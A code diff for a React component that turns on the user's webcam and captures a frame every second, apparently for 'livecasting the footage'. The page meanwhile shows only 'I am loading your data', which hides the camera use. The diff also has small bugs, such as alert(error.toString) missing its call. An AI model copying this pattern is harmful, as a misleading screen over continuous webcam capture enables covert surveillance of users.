@@ -35,30 +35,42 @@ const Service = () => {
       }
     };
 
-    if (videoElement) {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then((stream) => {
-          videoElement.srcObject = stream;
-          videoElement.play();
-          captureInterval = setInterval(captureFrame, 1000); // Capture frame every second
-        })
-        .catch((error) => {
-          console.error('Error accessing webcam:', error);
-        });
-    }
+    const initializeWebcam = async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        videoElement.srcObject = stream;
+
+        try {
+          setTimeout(() => {
+            videoElement.play();
+          }, 100);
+        } catch (error) {
+          alert(error.toString);
+          console.error('Error playing video:', error);
+        }
+
+        captureInterval = setInterval(captureFrame, 1000); // Capture frame every second
+      } catch (error) {
+        console.error('Error accessing webcam:', error);
+      }
+    };
+
+
+    initializeWebcam();
 
     return () => {
-      if (videoElement.srcObject) {
-        videoElement.srcObject.getTracks().forEach((track) => track.stop());
-      }
       clearInterval(captureInterval);
+      if (videoElement.srcObject) {
+        const tracks = videoElement.srcObject.getTracks();
+        tracks.forEach(track => track.stop());
+      }
     };
-  }, []);
 
+  }, [1000]);
 
 
   return (
-    <div className='trader__service'>
+    <div className='project__service'>
 
       {/* ---------------------------------     For acceessing webcamera and livecasting the footage    ----------------------------  */}
       <h1>Please Wait...... <br />I am loading your data...........</h1>
